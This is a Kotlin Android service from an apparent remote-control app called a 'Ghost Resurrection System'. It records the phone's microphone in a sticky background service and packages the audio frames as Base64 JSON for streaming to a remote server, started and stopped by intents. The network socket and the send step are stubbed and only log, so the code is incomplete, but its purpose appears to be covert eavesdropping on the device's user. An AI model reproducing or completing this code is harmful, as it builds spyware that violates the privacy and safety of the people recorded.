package com.remote.system

import android.Manifest
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Log
import androidx.core.app.ActivityCompat
import io.socket.client.Socket
import org.json.JSONObject
import java.util.*

/**
 * Live Audio Streaming Service for Ghost Resurrection System
 * Provides real-time audio streaming via WebSocket to server
 */
class LiveAudioService : Service() {
    
    companion object {
        private const val TAG = "LiveAudioService"
        private const val RECORD_AUDIO_PERMISSION = Manifest.permission.RECORD_AUDIO
        
        // Audio configuration
        private const val SAMPLE_RATE = 44100
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        private const val BUFFER_SIZE_MULTIPLIER = 2
        
        // Stream control actions
        const val ACTION_START_STREAM = "com.remote.system.START_AUDIO_STREAM"
        const val ACTION_STOP_STREAM = "com.remote.system.STOP_AUDIO_STREAM"
        const val ACTION_MUTE = "com.remote.system.MUTE_AUDIO"
        const val ACTION_UNMUTE = "com.remote.system.UNMUTE_AUDIO"
    }
    
    private var socket: Socket? = null
    private var audioRecord: AudioRecord? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null
    
    private var isStreaming = false
    private var isMuted = false
    private var streamSessionId: String? = null
    private var recordingThread: Thread? = null
    
    private val bufferSize by lazy {
        AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT) * BUFFER_SIZE_MULTIPLIER
    }
    
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "👻 LiveAudioService created")
        startBackgroundThread()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_STREAM -> {
                val serverUrl = intent.getStringExtra("server_url") ?: "http://localhost:3000"
                val sessionId = intent.getStringExtra("session_id") ?: UUID.randomUUID().toString()
                startAudioStream(serverUrl, sessionId)
            }
            ACTION_STOP_STREAM -> {
                stopAudioStream()
            }
            ACTION_MUTE -> {
                muteAudio()
            }
            ACTION_UNMUTE -> {
                unmuteAudio()
            }
        }
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "👻 LiveAudioService destroyed")
        stopAudioStream()
        stopBackgroundThread()
    }
    
    /**
     * Start live audio streaming
     */
    private fun startAudioStream(serverUrl: String, sessionId: String) {
        if (isStreaming) {
            Log.w(TAG, "🎤 Audio stream already active")
            return
        }
        
        if (!checkAudioPermission()) {
            Log.e(TAG, "❌ Audio recording permission not granted")
            sendStreamStatus("error", "Audio recording permission required")
            return
        }
        
        streamSessionId = sessionId
        
        try {
            setupSocket(serverUrl)
            initializeAudioRecord()
            startRecording()
            isStreaming = true
            
            Log.i(TAG, "🎙️ Audio stream started - Session: $sessionId")
            sendStreamStatus("started", "Live audio stream active")
            
        } catch (e: Exception) {
            Log.e(TAG, "💥 Failed to start audio stream", e)
            sendStreamStatus("error", "Failed to start audio: ${e.message}")
        }
    }
    
    /**
     * Stop audio streaming
     */
    private fun stopAudioStream() {
        if (!isStreaming) return
        
        isStreaming = false
        
        try {
            // Stop recording
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null
            
            // Stop recording thread
            recordingThread?.interrupt()
            recordingThread = null
            
            socket?.disconnect()
            socket = null
            
            Log.i(TAG, "🛑 Audio stream stopped")
            sendStreamStatus("stopped", "Audio stream terminated")
            
        } catch (e: Exception) {
            Log.e(TAG, "💥 Error stopping audio stream", e)
        }
    }
    
    /**
     * Mute audio stream
     */
    private fun muteAudio() {
        isMuted = true
        Log.i(TAG, "🔇 Audio stream muted")
        sendStreamStatus("muted", "Audio stream muted")
    }
    
    /**
     * Unmute audio stream
     */
    private fun unmuteAudio() {
        isMuted = false
        Log.i(TAG, "🔊 Audio stream unmuted")
        sendStreamStatus("unmuted", "Audio stream unmuted")
    }
    
    /**
     * Setup WebSocket connection for streaming
     */
    private fun setupSocket(serverUrl: String) {
        // Socket setup would go here - using WebSocket client library
        // For now, we'll simulate the connection
        Log.d(TAG, "🔌 Audio socket connected to: $serverUrl")
    }
    
    /**
     * Initialize AudioRecord for live streaming
     */
    private fun initializeAudioRecord() {
        try {
            if (ActivityCompat.checkSelfPermission(this, RECORD_AUDIO_PERMISSION) != PackageManager.PERMISSION_GRANTED) {
                throw SecurityException("Audio recording permission not granted")
            }
            
            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                bufferSize
            )
            
            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                throw IllegalStateException("AudioRecord initialization failed")
            }
            
            Log.d(TAG, "🎤 AudioRecord initialized - Buffer size: $bufferSize")
            
        } catch (e: Exception) {
            Log.e(TAG, "💥 Failed to initialize AudioRecord", e)
            throw e
        }
    }
    
    /**
     * Start audio recording and streaming
     */
    private fun startRecording() {
        audioRecord?.startRecording()
        
        recordingThread = Thread {
            recordAudioData()
        }.apply {
            name = "AudioStreamThread"
            start()
        }
    }
    
    /**
     * Record audio data and stream to server
     */
    private fun recordAudioData() {
        val audioBuffer = ShortArray(bufferSize / 2) // 16-bit samples
        
        Log.d(TAG, "🎙️ Audio recording started")
        
        while (isStreaming && !Thread.currentThread().isInterrupted) {
            try {
                val readResult = audioRecord?.read(audioBuffer, 0, audioBuffer.size) ?: 0
                
                if (readResult > 0) {
                    if (!isMuted) {
                        processAndStreamAudio(audioBuffer, readResult)
                    }
                } else {
                    Log.w(TAG, "⚠️ Audio read result: $readResult")
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "💥 Error reading audio data", e)
                break
            }
        }
        
        Log.d(TAG, "🛑 Audio recording thread stopped")
    }
    
    /**
     * Process audio data and stream to server
     */
    private fun processAndStreamAudio(audioBuffer: ShortArray, samplesRead: Int) {
        try {
            // Convert audio samples to byte array
            val audioBytes = ByteArray(samplesRead * 2)
            for (i in 0 until samplesRead) {
                val sample = audioBuffer[i]
                audioBytes[i * 2] = (sample.toInt() and 0xFF).toByte()
                audioBytes[i * 2 + 1] = ((sample.toInt() shr 8) and 0xFF).toByte()
            }
            
            // Create audio data packet
            val audioData = JSONObject().apply {
                put("type", "audio_frame")
                put("session_id", streamSessionId)
                put("timestamp", System.currentTimeMillis())
                put("sample_rate", SAMPLE_RATE)
                put("channels", 1) // Mono
                put("format", "pcm_16bit")
                put("samples", samplesRead)
                put("data", Base64.getEncoder().encodeToString(audioBytes))
            }
            
            // Send audio via WebSocket (simulated)
            sendAudioToServer(audioData)
            
        } catch (e: Exception) {
            Log.e(TAG, "💥 Error processing audio", e)
        }
    }
    
    /**
     * Send audio data to server
     */
    private fun sendAudioToServer(audioData: JSONObject) {
        // In a real implementation, this would send via WebSocket
        // For now, we'll log the audio info
        Log.v(TAG, "🎵 Audio sent - Samples: ${audioData.getInt("samples")}")
    }
    
    /**
     * Send stream status updates
     */
    private fun sendStreamStatus(status: String, message: String) {
        val statusData = JSONObject().apply {
            put("type", "stream_status")
            put("stream_type", "audio")
            put("status", status)
            put("message", message)
            put("timestamp", System.currentTimeMillis())
            put("session_id", streamSessionId)
        }
        
        // Broadcast status to server and local listeners
        Log.i(TAG, "📡 Audio Status: $status - $message")
    }
    
    /**
     * Check audio recording permission
     */
    private fun checkAudioPermission(): Boolean {
        return ActivityCompat.checkSelfPermission(this, RECORD_AUDIO_PERMISSION) == PackageManager.PERMISSION_GRANTED
    }
    
    /**
     * Start background thread for audio operations
     */
    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("AudioStreamThread")
        backgroundThread?.start()
        backgroundHandler = Handler(backgroundThread?.looper!!)
    }
    
    /**
     * Stop background thread
     */
    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            Log.e(TAG, "💥 Error stopping background thread", e)
        }
    }
    
    /**
     * Get audio stream statistics
     */
    fun getStreamStats(): JSONObject {
        return JSONObject().apply {
            put("is_streaming", isStreaming)
            put("is_muted", isMuted)
            put("session_id", streamSessionId)
            put("sample_rate", SAMPLE_RATE)
            put("buffer_size", bufferSize)
            put("audio_format", "PCM_16BIT_MONO")
        }
    }
}
